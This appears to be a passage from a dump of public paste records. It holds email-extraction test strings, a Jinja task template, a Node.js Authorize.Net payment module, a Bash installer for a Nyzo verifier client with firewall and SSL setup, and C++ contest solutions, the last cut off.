Aí@findmetesting.com
Uò@findmetesting.com
Yú@findmetesting.com
Marie-françoise@findmetesting.com
Uò@findmetesting.com
Inès@findmetesting.com
Océane@findmetesting.com
Marie-ève@findmetesting.com
Rébecca@findmetesting.com
Zoé@findmetesting.com
Lài@findmetesting.com
Rachèle@findmetesting.com
Cécile@findmetesting.com
Maïlys@findmetesting.com
Garçon@findmetesting.com
hereiam@testing.com

It's a game of per%entage percentage.
Findme#testing Findme testing.
Over&over&over Over over over.
[findmeinbrackets], findmeinbrackets
(findmeinbrackets), findmeinbrackets
<findmeinbrackets>, findmeinbrackets
{findmeinbrackets>}, findmeinbrackets
http://findme-testing.here.com
http:\\findme-testing.here.com

Vestibulum ante ipsum primis in faucibus orci luctus et ultrices Garçon@findmetesting.com cubilia Curae; Mauris viverra diam vitae quam. Suspendisse potenti. 
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Ellerey.Fanti@findmetesting.cn risus. Praesent lectus.

Vivamus metus arcu, adipiscing findmetesting@findmetesting.com, hendrerit at, vulputate vitae, nisl.

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
ZK2gLmKp,index.html,horozov86,Python,Tuesday 16th of January 2024 02:53:14 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
	<meta charset=""UTF-8"">
	<title>Task App</title>
</head>
<body>
	{% if tasks_list %}
	{% for task in tasks_list %}
	<h1>{{ task.task_title }}</h1>
	<p>{{ task.task_text }}</p>
	{% endfor %}
	{% else %}
	<p>There are no created tasks!</p>
	{% endif %}
</body>
</html>"
RRApFzGd,Untitled,KoctrX,JavaScript,Tuesday 16th of January 2024 02:23:16 AM CDT,"const authorizenet = require('authorizenet');
const config = require('../config');
const utils = require('../utils');
const PaymentCard = require('../models/PaymentCard');
const paymentModule = require('../modules/payments');
const permissinFields = require('../helpers/permissinFields');
const _ = require('lodash');
const moment = require('moment');

module.exports = class {
    constructor(user) {
        this.paymentSystem = 'Authorize.Net';
        const merchantAuthenticationType = new authorizenet.APIContracts.MerchantAuthenticationType();
        merchantAuthenticationType.setName(config.authorize_net_apiLoginID);
        merchantAuthenticationType.setTransactionKey(config.authorize_net_transactionKey);

        this.merchantAuthenticationType = merchantAuthenticationType;
        this.user = user;

        this.validationMode = authorizenet.APIContracts.ValidationModeEnum.TESTMODE;
        if (config.authorize_net_mode === 'LIVE') {
            this.validationMode = authorizenet.APIContracts.ValidationModeEnum.LIVEMODE;
        }

        console.log('CONSOLE>', this.validationMode);

        this.errors = [];
    }

    generateErrorResponse(def = '') {
        if ((this.errors || []).filter(text => Boolean((text || '').trim())).length) {
            return this.errors;
        }
        //if(this.errors.length) return this.errors;

        return def;
    }

    loggingError(error) {
        console.error('Authorizenet error: ', JSON.stringify(error));

        if (error && error.messages) {
            //this.errors = error.messages.message || [];
            this.errors = (error.messages.message || []).map(msg => msg.text);
        }

        return false;
    }

    isErrorAuthorize(response) {
        return response.messages && response.messages.resultCode === authorizenet.APIContracts.MessageTypeEnum.ERROR;
    }

    requestAuthorize(authorizeRequest) {
        return new Promise(resolve => authorizeRequest.execute(() => resolve(authorizeRequest.getResponse())));
    }

    getCustomerEmail() {
        //return `1aikit_user_${this.user.id}@${config.domainName}`;
        return `${utils.uuidv4()}${this.user.id}@${config.domainName}`;
    }

    async getCustomerProfile(customerProfileId = false) {
        if (this.customerProfile) return this.customerProfile;

        const getRequest = new authorizenet.APIContracts.GetCustomerProfileRequest();
        if (customerProfileId || this.user.customerProfileId) {
            getRequest.setCustomerProfileId(customerProfileId || this.user.customerProfileId);
        } else {
            getRequest.setEmail(this.getCustomerEmail());
        }

        getRequest.setMerchantAuthentication(this.merchantAuthenticationType);
        const ctrl = new authorizenet.APIControllers.GetCustomerProfileController(getRequest.getJSON());
        ctrl.setEnvironment(""https://api.authorize.net/xml/v1/request.api"");

        const responseCustomer = await this.requestAuthorize(ctrl);
        this.customerProfile = responseCustomer.profile || false;

        return this.customerProfile;
    }

    async validatePaymentMethod(customerPaymentProfileId, cvv) {
        console.log('BEFORE CUST');
        const customerProfile = await this.getCustomerProfile();
        if (!customerProfile) return false;

        const validateRequest = new authorizenet.APIContracts.ValidateCustomerPaymentProfileRequest();
        validateRequest.setMerchantAuthentication(this.merchantAuthenticationType);
        validateRequest.setCustomerProfileId(customerProfile.customerProfileId);
        validateRequest.setCustomerPaymentProfileId(customerPaymentProfileId);
        validateRequest.setValidationMode(this.validationMode);
        //validateRequest.setValidationMode(authorizenet.APIContracts.ValidationModeEnum.NONE);
        validateRequest.setCardCode(cvv);
        console.log('WTFFFFFFFF???????');

        const ctrl = new authorizenet.APIControllers.ValidateCustomerPaymentProfileController(validateRequest.getJSON());
        ctrl.setEnvironment(""https://api.authorize.net/xml/v1/request.api"");

        const result = await this.requestAuthorize(ctrl);
        if (this.isErrorAuthorize(result)) return this.loggingError(result);

        return result.messages.resultCode === authorizenet.APIContracts.MessageTypeEnum.OK;
    }

    async getPaymentMethod(customerPaymentProfileId) {
        const customerProfile = await this.getCustomerProfile();
        if (!customerProfile) return false;

        const getRequest = new authorizenet.APIContracts.GetCustomerPaymentProfileRequest();
        getRequest.setMerchantAuthentication(this.merchantAuthenticationType);
        getRequest.setCustomerProfileId(customerProfile.customerProfileId);
        getRequest.setCustomerPaymentProfileId(customerPaymentProfileId);

        const ctrl = new authorizenet.APIControllers.GetCustomerProfileController(getRequest.getJSON());
        ctrl.setEnvironment(""https://api.authorize.net/xml/v1/request.api"");

        const result = await this.requestAuthorize(ctrl);
        if (this.isErrorAuthorize(result)) return this.loggingError(result);

        return result;
    }

    async createOrGetProfileCustomer() {
        let customer = await this.getCustomerProfile();

        if (!customer) {
            const customerProfileType = new authorizenet.APIContracts.CustomerProfileType();
            customerProfileType.setDescription(`UserID: ${this.user.id}, user email: ${this.user.email}`);
            customerProfileType.setEmail(this.getCustomerEmail());

            const createRequest = new authorizenet.APIContracts.CreateCustomerProfileRequest();
            createRequest.setProfile(customerProfileType);
            createRequest.setMerchantAuthentication(this.merchantAuthenticationType);

            createRequest.setValidationMode(authorizenet.APIContracts.ValidationModeEnum.NONE);

            const ctrl = new authorizenet.APIControllers.CreateCustomerProfileController(createRequest.getJSON());
            ctrl.setEnvironment(""https://api.authorize.net/xml/v1/request.api"");

            const result = await this.requestAuthorize(ctrl);
            if (this.isErrorAuthorize(result)) return this.loggingError(result);

            console.log('BEFORE CUST', result);
            customer = await this.getCustomerProfile(result.customerProfileId);
        }

        if (!this.user.customerProfileId || this.user.customerProfileId !== customer.customerProfileId) {
            await this.user.update({ customerProfileId: customer.customerProfileId });
        }

        return customer;
    }

    async deleteCustomerPaymentProfile(customerPaymentProfileId) {
        const customerProfile = await this.createOrGetProfileCustomer();
        if (!customerProfile) return false;

        const deleteRequest = new authorizenet.APIContracts.DeleteCustomerPaymentProfileRequest();
        deleteRequest.setMerchantAuthentication(this.merchantAuthenticationType);
        deleteRequest.setCustomerProfileId(customerProfile.customerProfileId);
        deleteRequest.setCustomerPaymentProfileId(customerPaymentProfileId);
        const ctrl = new authorizenet.APIControllers.DeleteCustomerPaymentProfileController(deleteRequest.getJSON());
        ctrl.setEnvironment(""https://api.authorize.net/xml/v1/request.api"");
        const result = await this.requestAuthorize(ctrl);
        if (this.isErrorAuthorize(result)) return this.loggingError(result);

        return result;
    }

    generationCustomerAddress() {
        const customerAddress = new authorizenet.APIContracts.CustomerAddressType();
        customerAddress.setFirstName(this.user.first_name || 'John');
        customerAddress.setLastName(this.user.lastName || 'John');

        customerAddress.setAddress('');
        customerAddress.setCity('');
        customerAddress.setCity('');
        customerAddress.setCountry('');
        customerAddress.setZip('');

        // customerAddress.setAddress(randomStreetNumber + ' Main Street');
        // customerAddress.setCity('Bellevue');
        // customerAddress.setState('WA');
        // customerAddress.setZip('98004');
        // customerAddress.setCountry('USA');
        // customerAddress.setPhoneNumber('000-000-0000');

        return customerAddress;
    }

    // Create card if not exists
    async createCreditCard(data = {}) {
        const customerProfile = await this.createOrGetProfileCustomer();
        if (!customerProfile) return false;
        const isDefault = data.isDefault || false;

        const creditCard = new authorizenet.APIContracts.CreditCardType();
        creditCard.setCardNumber(data.cardNumber);
        creditCard.setExpirationDate(`${data.expMonth}${data.expYear}`);
        creditCard.setCardCode(data.cardCode);

        const paymentType = new authorizenet.APIContracts.PaymentType();
        paymentType.setCreditCard(creditCard);

        const customerAddress = this.generationCustomerAddress();

        const profile = new authorizenet.APIContracts.CustomerPaymentProfileType();
        profile.setBillTo(customerAddress);
        profile.setPayment(paymentType);
        profile.setDefaultPaymentProfile(isDefault);

        const createRequest = new authorizenet.APIContracts.CreateCustomerPaymentProfileRequest();
        createRequest.setMerchantAuthentication(this.merchantAuthenticationType);
        createRequest.setCustomerProfileId(customerProfile.customerProfileId);
        createRequest.setPaymentProfile(profile);

        const ctrl = new authorizenet.APIControllers.CreateCustomerPaymentProfileController(createRequest.getJSON());
        ctrl.setEnvironment(""https://api.authorize.net/xml/v1/request.api"");
        const result = await this.requestAuthorize(ctrl);

        if (!result.customerPaymentProfileId && this.isErrorAuthorize(result)) return this.loggingError(result);
        const paymentMethod = await this.getPaymentMethod(result.customerPaymentProfileId);
        if (!paymentMethod) return false;

        const isValidPayment = await this.validatePaymentMethod(paymentMethod.paymentProfile.customerPaymentProfileId, data.cardCode);
        if (!isValidPayment) {
            console.log('DELETE???');
            await this.deleteCustomerPaymentProfile(paymentMethod.paymentProfile.customerPaymentProfileId);
            return false;
        }

        let paymentCard = await PaymentCard.findOne({ where: { paymentId: paymentMethod.paymentProfile.customerPaymentProfileId } });

        if (!paymentCard) {
            paymentCard = await PaymentCard.create({
                userId: this.user.id,
                is_default: isDefault,
                exp_month: data.expMonth,
                exp_year: data.expYear,
                last4: utils.parseCardNumber(paymentMethod.paymentProfile.payment.creditCard.cardNumber),
                brand: paymentMethod.paymentProfile.payment.creditCard.cardType,
                fingerprint: paymentMethod.paymentProfile.customerPaymentProfileId,
                paymentId: paymentMethod.paymentProfile.customerPaymentProfileId,
                paymentSystem: this.paymentSystem,
                country: null
            });
        }

        if (isDefault) await paymentModule.setCardDefault(this.user.id, paymentCard.id);

        return _.pick(paymentCard || {}, permissinFields.cardAttributes);;
    }

    async updatePaymentMethod(customerPaymentProfileId, data) {
        const customerProfile = await this.createOrGetProfileCustomer();
        if (!customerProfile) return false;

        const paymentMethod = await this.getPaymentMethod(customerPaymentProfileId);
        if (!paymentMethod) return false;

        const creditCardForUpdate = new authorizenet.APIContracts.CreditCardType();
        creditCardForUpdate.setCardNumber(data.cardNumber);
        creditCardForUpdate.setExpirationDate(`${data.expMonth}${data.expYear}`);

        const paymentType = new authorizenet.APIContracts.PaymentType();
        paymentType.setCreditCard(creditCardForUpdate);
        const customerForUpdate = new authorizenet.APIContracts.CustomerPaymentProfileExType();
        customerForUpdate.setPayment(paymentType);
        customerForUpdate.setCustomerPaymentProfileId(paymentMethod.paymentProfile.customerPaymentProfileId);
        const updateRequest = new authorizenet.APIContracts.UpdateCustomerPaymentProfileRequest();

        updateRequest.setMerchantAuthentication(this.merchantAuthenticationType);
        updateRequest.setCustomerProfileId(customerProfile.customerProfileId);
        updateRequest.setPaymentProfile(customerForUpdate);
        updateRequest.setValidationMode(this.validationMode);

        const ctrl = new authorizenet.APIControllers.UpdateCustomerPaymentProfileController(updateRequest.getJSON());
        const result = await this.requestAuthorize(ctrl);

        if (!result.customerPaymentProfileId && this.isErrorAuthorize(result)) return this.loggingError(result);
        const paymentCard = await PaymentCard.findOne({
            where: {
                paymentId: paymentMethod.paymentProfile.customerPaymentProfileId
            }
        });

        if (paymentCard) {
            await paymentCard.update({
                exp_month: data.expMonth,
                exp_year: data.expYear,
                last4: utils.parseCardNumber(data.cardNumber)
            });
        }

        return _.pick(paymentCard || {}, permissinFields.cardAttributes);
    }

    async cancelSubscription(subscriptionId) {
        const cancelRequest = new authorizenet.APIContracts.ARBCancelSubscriptionRequest();
        cancelRequest.setMerchantAuthentication(this.merchantAuthenticationType);
        cancelRequest.setSubscriptionId(subscriptionId);

        const ctrl = new authorizenet.APIControllers.ARBCancelSubscriptionController(cancelRequest.getJSON());
        const result = await this.requestAuthorize(ctrl);
        if (!result.customerPaymentProfileId && this.isErrorAuthorize(result)) return this.loggingError(result);
        return result;
    }

    async getSubscribtionStatus(subscriptionId) {
        const getRequest = new authorizenet.APIContracts.ARBGetSubscriptionStatusRequest();
        getRequest.setMerchantAuthentication(this.merchantAuthenticationType);
        getRequest.setSubscriptionId(subscriptionId);

        const ctrl = new authorizenet.APIControllers.ARBGetSubscriptionStatusController(getRequest.getJSON());
        const result = await this.requestAuthorize(ctrl);
        if (!result.customerPaymentProfileId && this.isErrorAuthorize(result)) return this.loggingError(result);

        return result;
    }

    async createSubscription(card, plan) {
        const customerProfile = await this.createOrGetProfileCustomer();
        if (!customerProfile) return false;

        const paymentMethod = await this.getPaymentMethod(card.paymentId);
        if (!paymentMethod) return false;

        const sub = await this.getSubscribtion(this.user.authorizeSubscriptionId);
        if (this.user.authorizeSubscriptionId && sub) {
            const canceled = await this.cancelSubscription(this.user.authorizeSubscriptionId);
            if (this.isErrorAuthorize(canceled)) return this.loggingError(canceled);

            await this.user.update({ authorizeSubscriptionId: null });
        }

        const result = await this.createNewSubscriptionByPlan(plan, paymentMethod);
        if (!result.customerPaymentProfileId && this.isErrorAuthorize(result)) return this.loggingError(result);

        await this.user.update({
            authorizeSubscriptionId: result.subscriptionId,
            plan: plan.id
        });

        await this.user.increment('credits', { by: plan.credits });
        return result;
    }

    async getAllSubscribes() {
        const refId = utils.uuidv4().substring(0, 6);

        const sorting = new authorizenet.APIContracts.ARBGetSubscriptionListSorting();
        sorting.setOrderDescending(true);
        sorting.setOrderBy(authorizenet.APIContracts.ARBGetSubscriptionListOrderFieldEnum.CREATETIMESTAMPUTC);

        const paging = new authorizenet.APIContracts.Paging();
        paging.setOffset(1);
        paging.setLimit(100);

        const listRequest = new authorizenet.APIContracts.ARBGetSubscriptionListRequest();
        listRequest.setMerchantAuthentication(this.merchantAuthenticationType);

        listRequest.setRefId(refId);
        listRequest.setSearchType(authorizenet.APIContracts.ARBGetSubscriptionListSearchTypeEnum.SUBSCRIPTIONACTIVE);
        listRequest.setSorting(sorting);
        listRequest.setPaging(paging);

        const ctrl = new authorizenet.APIControllers.ARBGetSubscriptionListController(listRequest.getJSON());
        const result = await this.requestAuthorize(ctrl);
        if (!result.customerPaymentProfileId && this.isErrorAuthorize(result)) return this.loggingError(result);

        return result;
    }

    async createNewSubscriptionByPlan(plan, paymentMethod) {
        const customerProfile = await this.createOrGetProfileCustomer();
        if (!customerProfile) return false;

        const interval = new authorizenet.APIContracts.PaymentScheduleType.Interval();
        interval.setLength(1);
        interval.setUnit(authorizenet.APIContracts.ARBSubscriptionUnitEnum.MONTHS);

        const paymentScheduleType = new authorizenet.APIContracts.PaymentScheduleType();
        paymentScheduleType.setInterval(interval);
        paymentScheduleType.setStartDate(moment().format('YYYY-MM-DD'));
        paymentScheduleType.setTotalOccurrences(12);

        const customerProfileIdType = new authorizenet.APIContracts.CustomerProfileIdType();
        customerProfileIdType.setCustomerProfileId(customerProfile.customerProfileId);
        customerProfileIdType.setCustomerPaymentProfileId(paymentMethod.paymentProfile.customerPaymentProfileId);

        const arbSubscription = new authorizenet.APIContracts.ARBSubscriptionType();
        arbSubscription.setName(plan.name);
        arbSubscription.setPaymentSchedule(paymentScheduleType);
        arbSubscription.setAmount(plan.price);
        arbSubscription.setProfile(customerProfileIdType);

        const createRequest = new authorizenet.APIContracts.ARBCreateSubscriptionRequest();
        createRequest.setMerchantAuthentication(this.merchantAuthenticationType);
        createRequest.setSubscription(arbSubscription);

        const ctrl = new authorizenet.APIControllers.ARBCreateSubscriptionController(createRequest.getJSON());
        const result = await this.requestAuthorize(ctrl);
        if (!result.customerPaymentProfileId && this.isErrorAuthorize(result)) return this.loggingError(result);

        return result;
    }

    async getSubscribtion(subscriptionId) {
        const getRequest = new authorizenet.APIContracts.ARBGetSubscriptionRequest();
        getRequest.setMerchantAuthentication(this.merchantAuthenticationType);
        getRequest.setSubscriptionId(subscriptionId);
        const ctrl = new authorizenet.APIControllers.ARBGetSubscriptionController(getRequest.getJSON());
        const result = await this.requestAuthorize(ctrl);
        if (!result.customerPaymentProfileId && this.isErrorAuthorize(result)) return this.loggingError(result);

        return result;
    }
};"
PhZXKtDn,Untitled,benjaminvr,Bash,Tuesday 16th of January 2024 01:54:43 AM CDT,"#!/bin/bash
# Tested on ubuntu 22.04, certbot v1.21.0, nyzoVerifier v642

# Update the server
# Upgrade the server if necessary, remove the hashtag on the next line to do so
sudo apt update -y

# Install dependencies, things the application relies on to function properly
sudo apt install haveged -y
sudo apt install openjdk-8-jdk -y
sudo apt install supervisor -y
sudo apt install certbot -y

# Create a special directory for your client
mkdir /home/ubuntu && cd /home/ubuntu

# Allow network connectivity on the server level, check your virtual private server provider if this does not work. (todo add a page with overview comparing port blocks)
sudo ufw allow 9444/tcp
sudo ufw allow 9446/udp
sudo ufw allow 80/tcp 
sudo ufw allow 80/udp 
sudo ufw allow 443/tcp 
sudo ufw allow 443/udp 
sudo ufw allow 8080/tcp 
sudo ufw allow 8080/udp
sudo ufw allow 593/tcp 
sudo ufw allow 593/udp
sudo ufw allow 22/tcp 
sudo ufw allow 22/udp

# Copy the source code to your machine
git clone https://github.com/n-y-z-o/nyzoVerifier.git

# Java Gradlew converts this source code to machine readable binaries
cd nyzoVerifier
./gradlew build

# Create a folder for the client you're going to put into production, ie. activating and enabling your client
sudo mkdir -p /var/lib/nyzo/production

# The client will contact trusted verifiers first, if you provide none, your client will not work
# The default trusted entry points are by default ""nyzo.co"" controlled, ""nyzo.co"" scans the mesh of active verifiers and couples ipv4 addresses to specific subdomains when nodes have proven to behave correctly
# In addition to that a nyzo.org controlled node has been added
# You can replace the domain or ipv4 addresses in this file at your discretion, when running multiple verifiers it is recommended to trust node(s) you're already the owner of 
sudo cp trusted_entry_points /var/lib/nyzo/production
echo ""verifier0.nyzo.org:9444"" | sudo tee -a /var/lib/nyzo/production/trusted_entry_points > /dev/null

# Grant special rights to the script in order to be able to execute it
chmod +x nyzoClient.sh

# Change some values, alternatively update the file itself
sed -i -e 's/startretries=20/startretries=99999/g' nyzoClient.sh

# Run the script, it generates a supervisor configuration file for you
./nyzoClient.sh

# Copy this configuration file to the supervisor's production folders
sudo cp nyzoClient.conf /etc/supervisor/conf.d

# Static preferences to make your client function properly, default port 80
sudo echo -e ""web_port=80"" > /var/lib/nyzo/production/preferences

# Enter your client preferences, these get stored in the preferences file, adjusting the web ports should be sufficient for most users
sudo echo -e ""block_file_consolidator=disable
start_historical_block_manager=1
transaction_indexer_active=1
start_web_listener=1
"" >> /var/lib/nyzo/production/preferences

reload_instance(){
	# If trying to install multiple times, the log output is removed so the grep (searching the output file) will work 
	sudo rm /var/log/nyzo-client.log && sudo touch /var/log/nyzo-client.log

	# Reload the progress supervisor, awaits a clean output by status call
	sudo supervisorctl reload

	while ! (supervisorctl status | grep --line-buffered RUNNING); do
		:
	done

	echo ""Client started, pending launch end""

	# Await a successful client launch
	while ! (supervisorctl tail -9 nyzo_client | grep --line-buffered command); do 
		:
	done

	echo ""Client launched successfully, network status: $(supervisorctl tail -100 nyzo_client | grep ""frozen edge"")""

	# Certificate using LetsEncrypt
	# Create a temporary web forwarding proxy
	sudo mkdir /var/lib/nyzo/production/webTemp

	# Create SSL certificate, fetch using HTTP to be aware of liveliness of the web listener content 
	while ! (curl client.nyzo.org | grep --line-buffered frozenEdge); do 
		:
	done 

	echo ""Web listener live as indicated by HTTP fetch""
}

#reload_instance

getfullchainpem() { [[ $1 =~ ^/etc/letsencrypt/live/(.*fullchain\.pem)$ ]] && echo ""${BASH_REMATCH[1]}""; }
getprivkeypem() { [[ $1 =~ ^/etc/letsencrypt/live/(.*privkey\.pem)$ ]] && echo ""${BASH_REMATCH[1]}""; }


# Create your SSL certificate
# If you want the client to be reachable using a (sub)domain, enter details below
# e.g. client.nyzo.org 
CLIENT_DOMAIN=""""
# e.g. mail@domain.com 
SSL_CERT_EMAIL=""""
# Your export password, minimum 16 chars
SSL_EXPORT_PASSWORD=""""

if [[ ! (-z $CLIENT_DOMAIN || -z $SSL_CERT_EMAIL || -z $SSL_EXPORT_PASSWORD) ]]; then
	echo ""Setting up your SSL certificate""
	
	CERTBOT_RESULT=$(sudo certbot certonly -n -m $SSL_CERT_EMAIL --agree-tos --webroot --webroot-map '{""'$CLIENT_DOMAIN'"":""/var/lib/nyzo/production/webTemp""}' -d $CLIENT_DOMAIN --webroot-path '/var/lib/nyzo/production/webTemp')
	
	if [[ ""$CERTBOT_RESULT"" == *Successfully* ]]; then 
		echo ""Successfully generated SSL certificate""
		
		echo -e -n ""$CERTBOT_RESULT""
		
		CERT_PATH=$(getfullchainpem ""$CERTBOT_RESULT"")
		KEY_PATH=$(getprivkeypem ""$CERTBOT_RESULT"")
		
		echo ""$CERT_PATH""
		echo ""$KEY_PATH""
		
		sudo openssl pkcs12 -export -inkey ""$KEY_PATH"" -in ""$CERT_PATH"" generatedcert -out /var/lib/nyzo/production/ssl-keystore.p12 
		
		echo ""web_listener_keystore_path=/var/lib/nyzo/production/ssl-keystore.p12
web_listener_keystore_password="" ""$SSL_EXPORT_PASSWORD"" | sudo tee -a /var/lib/nyzo/production/preferences > /dev/null
		
		reload_instance
	else
		echo ""Failed to generate an SSL certificate, check your DNS records""
	fi
else
	echo ""Invalid domain, email or password length""
fi 

# When the server reboots, this will ensure the client starts as well
# This will remove active cronjobs, so be careful
echo ""@reboot sudo supervisorctl reload"" >> rebootcronjob
crontab rebootcronjob
rm rebootcronjob


"
wJAjrsPm,openol I 60,tiom4eg,C++,Tuesday 16th of January 2024 01:45:11 AM CDT,"#include <bits/stdc++.h>
// tiom4eg's precompiler options
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
// IO settings
#define fastIO ios_base::sync_with_stdio(false); cin.tie(0)
// Quick types
#define ll long long
#define ld long double
//#define ull unsigned long long
#define pii pair <int, int>
#define vi vector <int>
#define mi vector <vector <int>>
// Quick functions
#define endl ""\n""
#define F first
#define S second
#define all(a) a.begin(), a.end()
#define sz(a) (int)(a.size())
#define pb push_back
#define mp make_pair
// Quick fors
#define FOR(i, a, b) for (int i = a; i < b; ++i)
#define FORS(i, a, b, c) for (int i = a; i < b; i += c)
#define RFOR(i, a, b) for (int i = a; i >= b; --i)
#define EACH(e, a) for (auto& e : a)
// Pragmas
#ifndef TIOM4EG
#pragma GCC optimize(""O3"") // let the chaos begin!
#pragma GCC target(""avx,avx2,tune=native"")
#pragma GCC comment(linker, ""/stack:200000000"")
#endif
// PBDS
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>
#define pbds tree <int, null_type, less <int>, rb_tree_tag, tree_order_statistics_node_update>
using namespace __gnu_pbds;
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
using namespace std;
mt19937 rng(chrono::duration_cast<chrono::milliseconds>(chrono::system_clock::now().time_since_epoch()).count());
//#define int long long
constexpr int INF = 1e9 + 7, MD = 998244353, MAX = 2007, LG = 18, R = 1 << LG, MOD = 1000000007, MOD2 = 1e9 + 9, B = 256;
const ll INFLL = 1e18 + 7;

struct state {
    ll v;
    int cl;
    char ml, mr;
    state() : v(-INFLL) {}
    state(ll a, int b, char c, char d) : v(a), cl(b), ml(c), mr(d) {}
};

void conv(vector <state>& c, const vector <state>& a, const vector <state>& b, char ml, char mr) {
    int i = 0, j = 0;
    if (a[0].v + b[0].v > c[0].v) c[0] = state(a[0].v + b[0].v, 0, ml, mr);
    FOR(k, 1, sz(a) + sz(b) - 1) {
        if (j == sz(b) - 1 || (i != sz(a) - 1 && a[i + 1].v + b[j].v > a[i].v + b[j + 1].v)) ++i;
        else ++j;
        if (a[i].v + b[j].v > c[k].v) c[k] = state(a[i].v + b[j].v, i, ml, mr);
    }
}

ll w[200007];
vector <state> dp[2 * R][4]; // dp[i][0] - whole, dp[i][1] - w/o first, dp[i][2] - w/o last, dp[i][3] - w/o first & last; 0 >= 1, 0 >= 2, 1 >= 3, 2 >= 3

void dac(int l, int r, int v = 1) {
    dp[v][0].resize(1 + (r - l + 1) / 2);
    dp[v][1].resize(1 + (r - l) / 2);
    dp[v][2].resize(1 + (r - l) / 2);
    dp[v][3].resize(1 + (r - l - 1) / 2);
    if (l + 1 == r) {
        dp[v][0][0] = state(0, 0, 0, 0);
        dp[v][0][1] = state(w[l], 1, 0, 0);
        dp[v][1][0] = state(0, 0, 0, 0);
        dp[v][2][0] = state(0, 0, 0, 0);
        dp[v][3][0] = state(0, 0, 0, 0);
        return;
    }
    int m = (l + r) / 2;
    dac(l, m, 2 * v), dac(m, r, 2 * v + 1);
    conv(dp[v][0], dp[2 * v][0], dp[2 * v + 1][1], 0, 1);
    conv(dp[v][0], dp[2 * v][2], dp[2 * v + 1][0], 2, 0);
    conv(dp[v][1], dp[2 * v][3], dp[2 * v + 1][0], 3, 0);
    conv(dp[v][1], dp[2 * v][1], dp[2 * v + 1][1], 1, 1);
    conv(dp[v][2], dp[2 * v][0], dp[2 * v + 1][3], 0, 3);
    conv(dp[v][2], dp[2 * v][2], dp[2 * v + 1][2], 2, 2);
    conv(dp[v][3], dp[2 * v][3], dp[2 * v + 1][2], 3, 2);
    conv(dp[v][3], dp[2 * v][1], dp[2 * v + 1][3], 1, 3);
}

vi ans;
void restore(int l, int r, int k, char c, int v = 1) {
    if (l + 1 == r) {
        ans.pb(l);
        return;
    }
    int m = (l + r) / 2;
    if (dp[v][c][k].cl) restore(l, m, dp[v][c][k].cl, dp[v][c][k].ml, 2 * v);
    if (k - dp[v][c][k].cl) restore(m, r, k - dp[v][c][k].cl, dp[v][c][k].mr, 2 * v + 1);
}

#define int long long

vi g[MAX];
int es[MAX], vw[MAX], ew[MAX], par[MAX], sub[MAX];
int dp2[2][MAX][MAX]; // took edge?, vertex, how many took
int tmp[2][MAX];

void dfs(int v, int p = -1) {
    sub[v] = 1;
    EACH(id, g[v]) {
        int u = es[id] - v;
        if (u == p) {
            par[v] = id;
            continue;
        }
        dfs(u, v);
        sub[v] += sub[u];
    }
    dp2[0][v][0] = 0;
    FOR(i, 0, sub[v]) tmp[0][i] = tmp[1][i] = -INFLL;
    EACH(id, g[v]) if (id != par[v]) {
        int u = es[id] - v;
        // not took v->u
        FOR(pr, 0, sub[u]) {
            RFOR(i, sub[v] - 1, pr + (pr & 1)) {
                tmp[0][i] = max(tmp[0][i], dp2[0][v][i - pr - (pr & 1)] + dp2[0][u][pr]);
                tmp[1][i] = max(tmp[1][i], dp2[1][v][i - pr - (pr & 1)] + dp2[0][u][pr]);
            }
        }
        // took v->u
        FORS(pr, 0, sub[u], 2) {
            RFOR(i, sub[v] - 1, pr + 1) {
                tmp[1][i] = max(tmp[1][i], dp2[0][u][pr] + max(dp2[0][v][i - pr - 1] + vw[v], dp2[1][v][i - pr - 1]) - ew[id]);
            }
        }
        FOR(i, 0, sub[v]) dp2[0][v][i] = max(dp2[0][v][i], tmp[0][i]), dp2[1][v][i] = max(dp2[1][v][i], tmp[1][i]);
    }
    FOR(i, 0, sub[v]) {
        if (i & 1) {
            if (~p) dp2[0][v][i] = max(dp2[0][v][i], dp2[1][v][i] - ew[par[v]]);
        }
        else dp2[0][v][i] = max(dp2[0][v][i], dp2[1][v][i]);
    }
}

#undef int

signed main() {
    FOR(i, 0, MAX) FOR(j, 0, MAX) dp2[0][i][j] = dp2[1][i][j] = -INFLL;
    fastIO;
    int n, k, t; cin >> n >> k >> t;
    if (n <= 2000) {
        FOR(i, 0, n) cin >> vw[i];
        FOR(i, 1, n) {
            int u, v; cin >> u >> v >> ew[i], --u, --v;
            es[i] = u + v;
            g[u].pb(i), g[v].pb(i);
        }
        dfs(0);
        cout << dp2[0][0][2 * k];
        return 0;
    }
    vi a(n); EACH(e, a) cin >> e;
    vi b(n - 1); FOR(i, 0, n - 1) cin >> b[i] >> b[i] >> b[i];
    FOR(i, 0, n - 2) w[i] = a[i + 1] - b[i] - b[i + 1];
    dac(0, n - 2, 1);
    cout << dp[1][0][k].v << endl;
    if (t) {
        restore(0, n - 2, k, 0, 1);
        EACH(e, ans) cout << e + 2 << ' ' << e + 1 << ' ' << e + 3 << endl;
    }
}
"
gXXMFanX,openol H 100,tiom4eg,C++,Tuesday 16th of January 2024 01:44:09 AM CDT,"#include <bits/stdc++.h>
// tiom4eg's precompiler options
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
// IO settings
#define fastIO ios_base::sync_with_stdio(false); cin.tie(0)
// Quick types
#define ll long long
#define ld long double
//#define ull unsigned long long
#define pii pair <int, int>
#define vi vector <int>
#define mi vector <vector <int>>
// Quick functions
#define endl ""\n""
#define F first
#define S second
